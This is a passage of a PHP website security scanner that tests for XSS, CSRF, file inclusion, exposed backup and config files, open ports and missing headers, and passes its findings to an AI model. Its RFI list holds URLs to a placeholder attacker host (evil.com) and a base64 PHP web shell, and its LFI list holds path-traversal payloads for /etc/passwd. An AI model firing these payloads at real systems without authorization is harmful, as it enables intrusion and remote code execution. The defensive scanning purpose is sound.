            if ($this->isXSSVulnerable($testUrl, $payload)) {
                $this->addVulnerability([
                    'type' => 'Cross-Site Scripting (XSS)',
                    'severity' => 'HIGH',
                    'description' => 'Reflected XSS vulnerability detected',
                    'impact' => 'Session hijacking, credential theft, client-side compromise',
                    'remediation' => 'Implement output encoding, Content Security Policy, and input sanitization. Validate and encode all user input.',
                    'cvss_score' => 7.5,
                    'location' => 'URL parameter reflection',
                    'evidence' => "Payload reflected without encoding: " . htmlspecialchars($payload),
                    'category' => 'xss'
                ]);
                return;
            }
        }
        
        $this->addTestResult('xss_test', 'XSS Testing', 'success', 'No reflected XSS vulnerabilities detected');
    }

    private function buildTestUrl($baseUrl, $param, $value) {
        $separator = strpos($baseUrl, '?') !== false ? '&' : '?';
        return $baseUrl . $separator . $param . '=' . urlencode($value);
    }

    private function isXSSVulnerable($testUrl, $payload) {
        try {
            $content = $this->fetchUrlContent($testUrl);
            
            // Check if payload is reflected without proper encoding
            return strpos($content, $payload) !== false;
        } catch (Exception $e) {
            return false;
        }
    }

    private function testCSRFVulnerabilities($url) {
        try {
            $content = $this->fetchUrlContent($url);
            
            // Check for CSRF tokens in forms
            if (preg_match_all('/<form[^>]*>(.*?)<\/form>/is', $content, $forms)) {
                $formsWithoutTokens = 0;
                
                foreach ($forms[0] as $form) {
                    $hasToken = (strpos($form, 'csrf') !== false) || 
                               (strpos($form, 'token') !== false) ||
                               (strpos($form, 'nonce') !== false) ||
                               (preg_match('/name="[^"]*token[^"]*"/i', $form));
                    
                    if (!$hasToken && preg_match('/method="post"/i', $form)) {
                        $formsWithoutTokens++;
                    }
                }
                
                if ($formsWithoutTokens > 0) {
                    $this->addVulnerability([
                        'type' => 'Cross-Site Request Forgery (CSRF)',
                        'severity' => 'MEDIUM',
                        'description' => 'Forms missing CSRF protection',
                        'impact' => 'Unauthorized actions performed on behalf of authenticated users',
                        'remediation' => 'Implement CSRF tokens, use SameSite cookies, and validate state-changing operations',
                        'cvss_score' => 6.5,
                        'location' => 'HTML Forms',
                        'evidence' => "$formsWithoutTokens forms may lack CSRF protection",
                        'category' => 'csrf'
                    ]);
                } else {
                    $this->addTestResult('csrf_test', 'CSRF Protection', 'success', 'CSRF tokens detected in forms');
                }
            }
        } catch (Exception $e) {
            $this->addTestResult('csrf_test', 'CSRF Testing', 'error', $e->getMessage());
        }
    }

    private function testFileInclusionVulnerabilities($url) {
        $this->addTestResult('file_inclusion', 'File Inclusion Testing', 'info', 'Testing for Local and Remote File Inclusion vulnerabilities');
        
        $lfiPayloads = [
            '../../../../etc/passwd',
            '....//....//....//etc/passwd',
            '../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '..\\..\\..\\..\\boot.ini',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts'
        ];
        
        $rfiPayloads = [
            'http://evil.com/shell.txt',
            'https://raw.githubusercontent.com/evil/shell/master/shell.php',
            'ftp://evil.com/malicious.txt',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=',
            'php://filter/convert.base64-encode/resource=index.php'
        ];
        
        $vulnerable = false;
        
        // Test LFI
        foreach ($lfiPayloads as $payload) {
            $testUrl = $this->buildTestUrl($url, 'file', $payload);
            if ($this->isFileInclusionVulnerable($testUrl, $payload)) {
                $this->addVulnerability([
                    'type' => 'Local File Inclusion (LFI)',
                    'severity' => 'HIGH',
                    'description' => 'Application allows reading arbitrary local files through path manipulation',
                    'impact' => 'Sensitive file disclosure, source code exposure, potential RCE',
                    'remediation' => 'Validate file paths, use whitelists, and avoid user input in file operations. Use basename() and realpath() functions.',
                    'cvss_score' => 8.1,
                    'location' => 'File parameter',
                    'evidence' => "Potential LFI with payload: $payload",
                    'category' => 'file_inclusion'
                ]);
                $vulnerable = true;
                break;
            }
        }
        
        // Test RFI
        foreach ($rfiPayloads as $payload) {
            $testUrl = $this->buildTestUrl($url, 'include', $payload);
            if ($this->isRemoteFileInclusionVulnerable($testUrl, $payload)) {
                $this->addVulnerability([
                    'type' => 'Remote File Inclusion (RFI)',
                    'severity' => 'CRITICAL',
                    'description' => 'Application allows including remote files from external sources',
                    'impact' => 'Remote code execution, complete server compromise',
                    'remediation' => 'Disable allow_url_include in php.ini, use whitelists for included files, validate all file paths',
                    'cvss_score' => 9.8,
                    'location' => 'Include parameter',
                    'evidence' => "Potential RFI with payload: $payload",
                    'category' => 'file_inclusion'
                ]);
                $vulnerable = true;
                break;
            }
        }
        
        if (!$vulnerable) {
            $this->addTestResult('file_inclusion', 'File Inclusion Testing', 'success', 'No file inclusion vulnerabilities detected');
        }
    }

    private function isRemoteFileInclusionVulnerable($testUrl, $payload) {
        try {
            $ch = curl_init($testUrl);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_USERAGENT => 'SecurityScanner/2.0',
                CURLOPT_SSL_VERIFYPEER => false
            ]);
            
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            // RFI often results in different behavior or errors
            if ($httpCode === 200) {
                // Check for remote content indicators
                $rfiIndicators = [
                    'evil.com', 'malicious', 'shell', 'hack',
                    'remote file', 'external resource',
                    'allow_url_include', 'fopen wrapper'
                ];
                
                foreach ($rfiIndicators as $indicator) {
                    if (stripos($response, $indicator) !== false) {
                        return true;
                    }
                }
                
                // Check for PHP errors related to URL wrappers
                $wrapperErrors = [
                    '/fopen.*wrapper/i',
                    '/include.*failed/i',
                    '/url.*disabled/i',
                    '/remote file/i'
                ];
                
                foreach ($wrapperErrors as $pattern) {
                    if (preg_match($pattern, $response)) {
                        return true;
                    }
                }
            }
            
            return false;
            
        } catch (Exception $e) {
            return false;
        }
    }

    private function isFileInclusionVulnerable($testUrl, $payload) {
        try {
            $ch = curl_init($testUrl);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_USERAGENT => 'SecurityScanner/2.0',
                CURLOPT_SSL_VERIFYPEER => false
            ]);
            
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($httpCode === 200 && $response) {
                // Check for file inclusion indicators
                $fileIndicators = [
                    'root:', 'daemon:', 'bin/', '/bin/bash', // Linux /etc/passwd
                    'Administrator:', 'Guest:', // Windows user accounts
                    '[boot loader]', '[operating systems]', // Windows boot.ini
                    '<?php', '<?=', '<script', // Code snippets
                    'for 16-bit app support', // Windows system files
                    'DocumentRoot', 'ServerName', // Apache config
                    'DB_HOST', 'DB_USER', 'DB_PASS' // Database config
                ];
                
                foreach ($fileIndicators as $indicator) {
                    if (stripos($response, $indicator) !== false) {
                        return true;
                    }
                }
                
                // Check for error messages that indicate file access
                $errorPatterns = [
                    '/failed to open stream/i',
                    '/no such file or directory/i',
                    '/permission denied/i',
                    '/invalid file/i'
                ];
                
                foreach ($errorPatterns as $pattern) {
                    if (preg_match($pattern, $response)) {
                        return true;
                    }
                }
            }
            
            return false;
            
        } catch (Exception $e) {
            return false;
        }
    }

    private function performInformationDisclosureTests($url) {
        $this->addTestResult('info_disclosure', 'Information Disclosure Testing', 'info', 'Checking for sensitive information exposure');
        
        $this->testDirectoryListing($url);
        $this->testBackupFileExposure($url);
        $this->testConfigFileExposure($url);
    }

    private function testDirectoryListing($url) {
        $testPaths = ['/', '/images/', '/css/', '/js/', '/admin/', '/uploads/'];
        
        foreach ($testPaths as $path) {
            $testUrl = rtrim($url, '/') . $path;
            if ($this->hasDirectoryListing($testUrl)) {
                $this->addVulnerability([
                    'type' => 'Directory Listing Enabled',
                    'severity' => 'MEDIUM',
                    'description' => 'Directory listing is enabled',
                    'impact' => 'Information disclosure of directory contents',
                    'remediation' => 'Disable directory listing in web server configuration',
                    'cvss_score' => 5.3,
                    'location' => "Path: $path",
                    'evidence' => 'Directory listing exposes file structure',
                    'category' => 'information_disclosure'
                ]);
            }
        }
    }

    private function hasDirectoryListing($url) {
        try {
            $content = $this->fetchUrlContent($url);
            
            $listingIndicators = [
                '<title>Index of',
                '<h1>Index of',
                'Parent Directory</a>',
                'To Parent Directory'
            ];
            
            foreach ($listingIndicators as $indicator) {
                if (stripos($content, $indicator) !== false) {
                    return true;
                }
            }
            
            return false;
        } catch (Exception $e) {
            return false;
        }
    }

    private function testBackupFileExposure($url) {
        $backupFiles = ['.bak', '.backup', '.old', '.save'];
        $commonFiles = ['index', 'config', 'database', 'wp-config'];
        
        foreach ($commonFiles as $file) {
            foreach ($backupFiles as $ext) {
                $testUrl = rtrim($url, '/') . '/' . $file . $ext;
                if ($this->checkUrlExists($testUrl)) {
                    $this->addVulnerability([
                        'type' => 'Backup File Exposure',
                        'severity' => 'HIGH',
                        'description' => 'Backup file accessible publicly',
                        'impact' => 'Source code, database dumps, and configuration exposure',
                        'remediation' => 'Remove backup files from web-accessible directories',
                        'cvss_score' => 7.5,
                        'location' => "File: $file$ext",
                        'evidence' => "Backup file found: $testUrl",
                        'category' => 'information_disclosure'
                    ]);
                }
            }
        }
    }

    private function testConfigFileExposure($url) {
        $configFiles = ['.env', 'config.php', 'wp-config.php', 'configuration.php'];
        
        foreach ($configFiles as $configFile) {
            $testUrl = rtrim($url, '/') . '/' . $configFile;
            if ($this->checkUrlExists($testUrl)) {
                $this->addVulnerability([
                    'type' => 'Configuration File Exposure',
                    'severity' => 'CRITICAL',
                    'description' => 'Configuration file accessible publicly',
                    'impact' => 'Database credentials, API keys, and configuration exposure',
                    'remediation' => 'Move configuration files outside web root and block access',
                    'cvss_score' => 8.2,
                    'location' => "File: $configFile",
                    'evidence' => "Configuration file found: $testUrl",
                    'category' => 'information_disclosure'
                ]);
            }
        }
    }

    private function performSSLTLSAnalysis($url) {
        if (strpos($url, 'https://') !== 0) {
            $this->addVulnerability([
                'type' => 'No HTTPS Enforcement',
                'severity' => 'HIGH',
                'description' => 'Website not using HTTPS',
                'impact' => 'Data transmitted in clear text, vulnerable to interception',
                'remediation' => 'Implement HTTPS and redirect all HTTP traffic to HTTPS',
                'cvss_score' => 7.5,
                'location' => 'Website Protocol',
                'evidence' => 'Website accessible via HTTP without HTTPS redirect',
                'category' => 'ssl_tls'
            ]);
            return;
        }
        
        $sslInfo = $this->getSSLInformation($url);
        
        if (isset($sslInfo['valid']) && !$sslInfo['valid']) {
            $this->addVulnerability([
                'type' => 'Invalid SSL Certificate',
                'severity' => 'HIGH',
                'description' => 'SSL certificate is invalid or expired',
                'impact' => 'Man-in-the-middle attacks, data interception',
                'remediation' => 'Renew SSL certificate and ensure proper configuration',
                'cvss_score' => 7.4,
                'location' => 'SSL/TLS Configuration',
                'evidence' => 'SSL certificate validation failed',
                'category' => 'ssl_tls'
            ]);
        }
    }

    private function performPortScanning($url) {
        $this->addTestResult('port_scan', 'Port Scanning', 'info', 'Scanning common ports for services');
        
        $host = parse_url($url, PHP_URL_HOST);
        $commonPorts = [
            21 => 'FTP', 22 => 'SSH', 23 => 'Telnet', 25 => 'SMTP', 53 => 'DNS',
            80 => 'HTTP', 110 => 'POP3', 443 => 'HTTPS', 993 => 'IMAPS', 995 => 'POP3S',
            1433 => 'MSSQL', 1521 => 'Oracle', 3306 => 'MySQL', 3389 => 'RDP',
            5432 => 'PostgreSQL', 27017 => 'MongoDB'
        ];
        
        foreach ($commonPorts as $port => $service) {
            if ($this->isPortOpen($host, $port)) {
                $this->addVulnerability([
                    'type' => "Open Port - $service",
                    'severity' => $this->getPortSeverity($port),
                    'description' => "$service port ($port) is open",
                    'impact' => 'Potential attack surface for service-specific vulnerabilities',
                    'remediation' => 'Close unnecessary ports or implement proper security controls',
                    'cvss_score' => $this->getPortCVSS($port),
                    'location' => "Network - Port $port",
                    'evidence' => "$service service accessible on port $port",
                    'category' => 'network_security'
                ]);
            }
        }
    }

    private function getPortSeverity($port) {
        $criticalPorts = [21, 22, 23, 25, 53, 443, 3306, 3389];
        $highPorts = [80, 110, 993, 995, 1433, 1521, 5432];
        
        if (in_array($port, $criticalPorts)) return 'CRITICAL';
        if (in_array($port, $highPorts)) return 'HIGH';
        return 'MEDIUM';
    }

    private function getPortCVSS($port) {
        $scores = [
            21 => 7.3, 22 => 8.1, 23 => 8.0, 25 => 6.5, 53 => 5.0,
            80 => 5.3, 443 => 5.3, 3306 => 8.9, 3389 => 8.8
        ];
        
        return $scores[$port] ?? 5.0;
    }

    private function addVulnerability($vulnData) {
        // Ensure CVSS score is calculated
        $cvssScore = $vulnData['cvss_score'] ?? $this->calculateDefaultCVSS($vulnData['severity'] ?? 'MEDIUM');
        
        $vulnerability = [
            'id' => 'vuln_' . uniqid(),
            'type' => $vulnData['type'],
            'severity' => strtoupper($vulnData['severity']),
            'description' => $vulnData['description'],
            'impact' => $vulnData['impact'],
            'remediation' => $vulnData['remediation'],
            'cvss_score' => (float)$cvssScore,
            'location' => $vulnData['location'],
            'evidence' => $vulnData['evidence'],
            'category' => $vulnData['category'],
            'timestamp' => date('Y-m-d H:i:s')
        ];
        
        if (isset($vulnData['cves'])) {
            $vulnerability['cves'] = $vulnData['cves'];
        }
        
        $this->scanResults['vulnerabilities'][] = $vulnerability;
        $this->scanResults['tests_failed']++;
        
        // Categorize for reporting
        $this->categorizeVulnerability($vulnerability);
    }

    private function categorizeVulnerability($vulnerability) {
        $category = $vulnerability['category'];
        if (!isset($this->scanResults[$category])) {
            $this->scanResults[$category] = [];
        }
        $this->scanResults[$category][] = $vulnerability;
    }
    
    private function gatherWebsiteInfo($url) {
        $this->addTestResult('website_info_gathering', 'Website Information Gathering', 'info');
        
        $websiteData = [
            'url' => $url,
            'headers' => $this->getHeaders($url),
            'technologies' => $this->detectTechnologies($url),
            'content_analysis' => $this->analyzeContent($url),
            'security_headers' => $this->checkSecurityHeaders($url),
            'server_info' => $this->getServerInfo($url),
            'dns_info' => $this->getDNSInfo($url),
            'timestamp' => date('c')
        ];
        
        $this->addTestResult('website_info_gathering', 'Website Information Gathering', 'success');
        return $websiteData;
    }

    private function getServerInfo($url) {
        $this->addTestResult('server_info', 'Server Information Detection', 'info');
        
        $host = parse_url($url, PHP_URL_HOST);
        $serverInfo = [];
        
        try {
            // Get server headers
            $headers = $this->getHeaders($url);
            
            if (isset($headers['Server'])) {
                $serverInfo['server_software'] = $headers['Server'];
                $this->addTestResult('server_software', 'Server Software Detection', 'success', 
                    "Detected: " . $headers['Server']);
            } else {
                $this->addTestResult('server_software', 'Server Software Detection', 'warning', 
                    "Server header not exposed");
            }
            
            if (isset($headers['X-Powered-By'])) {
                $serverInfo['powered_by'] = $headers['X-Powered-By'];
                $this->addTestResult('powered_by', 'Powered-By Header', 'success', 
                    "Detected: " . $headers['X-Powered-By']);
            }
            
            // Get IP information
            $ip = gethostbyname($host);
            $serverInfo['ip_address'] = $ip;
            $this->addTestResult('ip_resolution', 'IP Address Resolution', 'success', "Resolved to: $ip");
            
        } catch (Exception $e) {
            $this->addTestResult('server_info', 'Server Information Detection', 'error', $e->getMessage());
        }
        
        return $serverInfo;
    }

    private function getDNSInfo($url) {
        $this->addTestResult('dns_info', 'DNS Information Gathering', 'info');
        
        $host = parse_url($url, PHP_URL_HOST);
        $dnsInfo = [];
        
        try {
            // Get A record
            $records = dns_get_record($host, DNS_A);
            if ($records) {
                $dnsInfo['a_records'] = array_column($records, 'ip');
                $this->addTestResult('dns_a', 'DNS A Records', 'success', 
                    "Found " . count($records) . " A records");
            }
            
            // Get MX records
            $mxRecords = dns_get_record($host, DNS_MX);
            if ($mxRecords) {
                $dnsInfo['mx_records'] = $mxRecords;
                $this->addTestResult('dns_mx', 'DNS MX Records', 'success', 
                    "Found " . count($mxRecords) . " MX records");
            }
            
            // Get TXT records
            $txtRecords = dns_get_record($host, DNS_TXT);
            if ($txtRecords) {
                $dnsInfo['txt_records'] = $txtRecords;
                $this->addTestResult('dns_txt', 'DNS TXT Records', 'success', 
                    "Found " . count($txtRecords) . " TXT records");
                
                // Check for security TXT records
                foreach ($txtRecords as $record) {
                    if (isset($record['txt'])) {
                        if (strpos($record['txt'], 'v=spf1') !== false) {
                            $this->addTestResult('spf_record', 'SPF Record Check', 'success', "SPF record found");
                        }
                        if (strpos($record['txt'], 'v=DMARC1') !== false) {
                            $this->addTestResult('dmarc_record', 'DMARC Record Check', 'success', "DMARC record found");
                        }
                    }
                }
            }
            
        } catch (Exception $e) {
            $this->addTestResult('dns_info', 'DNS Information Gathering', 'error', $e->getMessage());
        }
        
        return $dnsInfo;
    }
    
    private function getHeaders($url) {
        $headers = [];
        
        try {
            $ch = curl_init($url);
            
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HEADER => true,
                CURLOPT_NOBODY => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => 0
            ]);
            
            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            
            if (curl_error($ch)) {
                throw new Exception('cURL error: ' . curl_error($ch));
            }
            
            curl_close($ch);
            
            // Parse headers from response
            $headerText = substr($response, 0, strpos($response, "\r\n\r\n"));
            $headerLines = explode("\r\n", $headerText);
            
            foreach ($headerLines as $line) {
                if (strpos($line, ':') !== false) {
                    list($key, $value) = explode(':', $line, 2);
                    $headers[trim($key)] = trim($value);
                }
            }
            
            $headers['HTTP_Status'] = $httpCode;
            
        } catch (Exception $e) {
            $headers['Error'] = $e->getMessage();
        }
        
        return $headers;
    }
    
    private function detectTechnologies($url) {
        $technologies = [];
        
        try {
            $ch = curl_init($url);
            
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => 0
            ]);
            
            $htmlContent = curl_exec($ch);
            
            if (curl_error($ch)) {
                throw new Exception('cURL error: ' . curl_error($ch));
            }
            
            curl_close($ch);
            
            // Your existing technology detection patterns...
            $techPatterns = [
                'WordPress' => ['/wp-content/', '/wp-includes/', '/wordpress/i'],
                'Joomla' => ['/joomla/i', '/media\/joomla/'],
                'Drupal' => ['/drupal/i', '/sites\/all/'],
                'React' => ['/react/', '/__next/'],
                'Vue.js' => ['/vue/', '/vuex/'],
                'Angular' => ['/angular/', '/ng-/'],
                'jQuery' => ['/jquery/'],
                'JavaScript' => ['/javascript/'],
                'Bootstrap' => ['/bootstrap/'],
                'PHP' => ['/\.php\?/', '/phpsessid/i'],
                'ASP.NET' => ['/asp.net/i', '/__viewstate/i'],
                'Nginx' => ['/nginx/i'],
                'Apache' => ['/apache/i'],
                'Cloudflare' => ['/cloudflare/i']
            ];
            
            foreach ($techPatterns as $tech => $patterns) {
                foreach ($patterns as $pattern) {
                    if (preg_match($pattern, $htmlContent)) {
                        $technologies[] = $tech;
                        break;
                    }
                }
            }
            
            // Remove duplicates and return
            $technologies = array_unique($technologies);
            
        } catch (Exception $e) {
            $technologies = ['Error: ' . $e->getMessage()];
        }
        
        return $technologies;
    }
    
    private function analyzeContent($url) {
        $analysis = [];
        
        try {
            $ch = curl_init($url);
            
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; SecurityScanner/1.0)',
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => 0
            ]);
            
            $htmlContent = curl_exec($ch);
            
            if (curl_error($ch)) {
                throw new Exception('cURL error: ' . curl_error($ch));
            }
            
            curl_close($ch);
            
            // Basic content analysis
            $analysis['content_length'] = strlen($htmlContent);
            $analysis['has_forms'] = preg_match('/<form/i', $htmlContent) ? true : false;
            $analysis['form_count'] = preg_match_all('/<form/i', $htmlContent, $matches);
            $analysis['has_inputs'] = preg_match('/<input/i', $htmlContent) ? true : false;
            $analysis['input_count'] = preg_match_all('/<input/i', $htmlContent, $matches);
            $analysis['has_scripts'] = preg_match('/<script/i', $htmlContent) ? true : false;
            $analysis['script_count'] = preg_match_all('/<script/i', $htmlContent, $matches);
            
        } catch (Exception $e) {
            $analysis['error'] = $e->getMessage();
        }
        
        return $analysis;
    }
    
    private function checkSecurityHeaders($url) {
        $securityHeaders = [];
        $requiredHeaders = [
            'Content-Security-Policy',
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Referrer-Policy'
        ];
        
        $headers = $this->getHeaders($url);
        
        foreach ($requiredHeaders as $header) {
            $securityHeaders[$header] = [
                'present' => isset($headers[$header]),
                'value' => $headers[$header] ?? 'Not set'
            ];
        }
        
        return $securityHeaders;
    }
    
    private function getHeaderRecommendation($header) {
        $recommendations = [
            'Content-Security-Policy' => 'Implement CSP to prevent XSS attacks',
            'X-Content-Type-Options' => 'Set to "nosniff" to prevent MIME type sniffing',
            'X-Frame-Options' => 'Set to "DENY" or "SAMEORIGIN" to prevent clickjacking',
            'X-XSS-Protection' => 'Set to "1; mode=block" to enable XSS protection',
            'Strict-Transport-Security' => 'Implement HSTS to enforce HTTPS',
            'Referrer-Policy' => 'Set appropriate referrer policy for privacy'
        ];
        
        return $recommendations[$header] ?? 'Consider implementing this security header';
    }

    private function performQuickScan($url, $websiteData) {
        $this->addTestResult('quick_scan', 'Quick Security Scan Initiated', 'info');
        
        // Perform comprehensive quick scan tests
        $this->performSecurityHeaderTests($url);
        $this->performTechnologyAnalysis($url);
        $this->performContentSecurityTests($url);
        $this->performSSLTLSTests($url);
        $this->performInformationDisclosureTests($url);
        
        $prompt = "Perform a comprehensive quick security assessment of {$url}. Analyze:
        - Security headers implementation
        - Technology stack vulnerabilities  
        - Common web vulnerabilities (XSS, SQLi, CSRF)
        - SSL/TLS configuration issues
        - Information disclosure risks
        - Server configuration issues
        
        Provide specific findings with CVSS scores and remediation steps.";
        
        $aiResponse = $this->ollama->analyzeForTool('vulnerability', $url, [
            'scan_type' => 'quick',
            'website_data' => $websiteData,
            'test_results' => $this->scanResults
        ]);
        
        $this->addTestResult('quick_scan', 'Quick Security Scan Completed', 'success');
        
        return $this->formatVulnerabilityResponse($aiResponse, $websiteData, 'quick');
    }

    private function performSecurityHeaderTests($url) {
        $this->addTestResult('security_headers', 'Security Headers Analysis', 'info');
        
        $headers = $this->getHeaders($url);
        $securityHeaders = [
            'Content-Security-Policy' => 'Prevents XSS attacks',
            'X-Content-Type-Options' => 'Prevents MIME sniffing',
            'X-Frame-Options' => 'Prevents clickjacking',
            'X-XSS-Protection' => 'XSS protection',
            'Strict-Transport-Security' => 'Enforces HTTPS',
            'Referrer-Policy' => 'Controls referrer information',
            'Feature-Policy' => 'Controls browser features',
            'Permissions-Policy' => 'Controls browser permissions'
        ];
        
        $missingHeaders = [];
        $presentHeaders = [];
        
        foreach ($securityHeaders as $header => $description) {
            if (isset($headers[$header])) {
                $presentHeaders[] = $header;
                $this->addTestResult("header_$header", "$header Check", 'success', 
                    "Present: " . $headers[$header]);
            } else {
                $missingHeaders[] = $header;
                $this->addTestResult("header_missing", "$header Check", 'medium', 
                    "Missing - $description", [
                        'header' => $header,
                        'description' => $description
                    ]);
            }
        }
        
        // Specific CSP checks
        if (isset($headers['Content-Security-Policy'])) {
            $csp = $headers['Content-Security-Policy'];
            if (strpos($csp, 'unsafe-inline') !== false) {
                $this->addTestResult('csp_unsafe_inline', 'CSP unsafe-inline', 'medium', 
                    "CSP contains unsafe-inline - reduces XSS protection");
            }
        } else {
            $this->addTestResult('csp_missing', 'CSP Implementation', 'high', 
                "Content Security Policy not implemented - XSS protection missing");
        }
        
        // Calculate security headers score
        $headersScore = count($presentHeaders) / count($securityHeaders) * 100;
        $this->addTestResult('headers_score', 'Security Headers Score', 'info', 
            "Score: " . round($headersScore, 1) . "% - " . count($presentHeaders) . "/" . 
            count($securityHeaders) . " headers implemented");
    }

    private function performTechnologyAnalysis($url) {
        $this->addTestResult('technology_analysis', 'Technology Stack Analysis', 'info');
        
        $technologies = $this->detectTechnologies($url);
        
        if (!empty($technologies)) {
            $this->addTestResult('tech_detection', 'Technology Detection', 'success', 
                "Detected: " . implode(', ', array_slice($technologies, 0, 10)));
            
            // Check for outdated technologies
            $this->checkOutdatedTechnologies($technologies);
        } else {
            $this->addTestResult('tech_detection', 'Technology Detection', 'warning', 
                "No technologies detected");
        }
    }

    private function checkOutdatedTechnologies($technologies) {
        $outdated = [
            'jquery' => ['test_id' => 'outdated_jquery', 'risk' => 'medium'],
            'php' => ['test_id' => 'outdated_php', 'risk' => 'critical'],
            'wordpress' => ['test_id' => 'outdated_wordpress', 'risk' => 'high']
        ];
        
        foreach ($technologies as $tech) {
            $techLower = strtolower($tech);
            foreach ($outdated as $outTech => $info) {
                if (strpos($techLower, $outTech) !== false) {
                    $this->addTestResult($info['test_id'], "Outdated $tech", $info['risk'], 
                        "Potentially outdated version detected - requires version verification", [
                            'technology' => $tech
                        ]);
                }
            }
        }
    }

    private function performContentSecurityTests($url) {
        $this->addTestResult('content_security', 'Content Security Analysis', 'info');
        
        try {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 10,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; SecurityScanner/1.0)'
            ]);
            
            $content = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($httpCode === 200) {
                // Check for mixed content
                if (preg_match('/http:\/\/([^"\']*)/i', $content) && strpos($url, 'https://') === 0) {
                    $this->addTestResult('mixed_content', 'Mixed Content Check', 'high', 
                        "HTTP resources found on HTTPS page");
                }
                
                // Check for exposed comments
                if (preg_match_all('/<!--(.*?)-->/s', $content, $comments)) {
                    $sensitiveComments = 0;
                    foreach ($comments[1] as $comment) {
                        if (preg_match('/(password|key|secret|admin|debug|todo|fixme)/i', $comment)) {
                            $sensitiveComments++;
                        }
                    }
                    if ($sensitiveComments > 0) {
                        $this->addTestResult('sensitive_comments', 'Sensitive Comments', 'medium', 
                            "Found $sensitiveComments comments with potentially sensitive information");
                    }
                }
                
                // Check for exposed emails
                if (preg_match_all('/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/', $content, $emails)) {
                    $this->addTestResult('exposed_emails', 'Exposed Email Addresses', 'low', 
                        "Found " . count($emails[0]) . " email addresses in content");
                }
                
                $this->addTestResult('content_analysis', 'Content Analysis', 'success', 
                    "Content security analysis completed");
            }
            
        } catch (Exception $e) {
            $this->addTestResult('content_security', 'Content Security Analysis', 'error', $e->getMessage());
        }
    }

    private function performSSLTLSTests($url) {
        $this->addTestResult('ssl_tls', 'SSL/TLS Configuration Check', 'info');
        
        $sslInfo = $this->checkSSLCertificate($url);
        
        if (isset($sslInfo['valid'])) {
            if ($sslInfo['valid']) {
                $this->addTestResult('ssl_valid', 'SSL Certificate Validity', 'success', 
                    "Certificate is valid until " . $sslInfo['expires']);
                
                if ($sslInfo['days_remaining'] < 30) {
                    $this->addTestResult('ssl_expiry', 'SSL Certificate Expiry', 'high', 
                        "Certificate expires in " . $sslInfo['days_remaining'] . " days");
                }
            } else {
                $this->addTestResult('ssl_valid', 'SSL Certificate Validity', 'critical', 
                    "Certificate is invalid or expired");
            }
            
            if (isset($sslInfo['issuer'])) {
                $this->addTestResult('ssl_issuer', 'SSL Certificate Issuer', 'info', 
                    "Issued by: " . $sslInfo['issuer']);
            }
        } else {
            $this->addTestResult('ssl_check', 'SSL Certificate Check', 'error', 
                "SSL check failed: " . ($sslInfo['error'] ?? 'Unknown error'));
        }
    }

    private function performFullScan($url, $websiteData) {
        $this->addTestResult('full_scan', 'Full Comprehensive Scan Initiated', 'info');
        
        // Include all quick scan tests
        $this->performQuickScan($url, $websiteData);
        
        // Additional full scan tests
        $this->performPortScanning($url);
        $this->performDirectoryEnumeration($url);
        $this->performVulnerabilitySpecificTests($url);
        $this->performAdvancedHeaderAnalysis($url);
        $this->performCSPAnalysis($url);
        $this->performCookieSecurityAnalysis($url);
        $this->performWebServerAnalysis($url);
        $this->performFrameworkSpecificTests($url);
        
        $prompt = "Perform a comprehensive full security scan of {$url}. Include detailed analysis of:
        - Complete technology stack with version information
        - All security headers and configurations
        - SSL/TLS implementation details
        - Port and service enumeration results
        - Directory and file structure analysis
        - Advanced vulnerability assessment
        - Cookie security and session management
        - Content Security Policy implementation
        - API endpoint security
        - Database and backend security
        
        Provide extremely detailed findings with specific CVSS scores, evidence, and step-by-step remediation guidance.";
        
        $aiResponse = $this->ollama->analyzeForTool('vulnerability', $url, [
            'scan_type' => 'full',
            'website_data' => $websiteData,
            'test_results' => $this->scanResults
        ]);
        
        $this->addTestResult('full_scan', 'Full Comprehensive Scan Completed', 'success');
        
        $response = $this->formatVulnerabilityResponse($aiResponse, $websiteData, 'full');
        
        // Add full scan specific details
        $response['data']['full_scan_details'] = [
            'comprehensive_analysis' => true,
            'tests_performed' => $this->scanResults['tests_performed'],
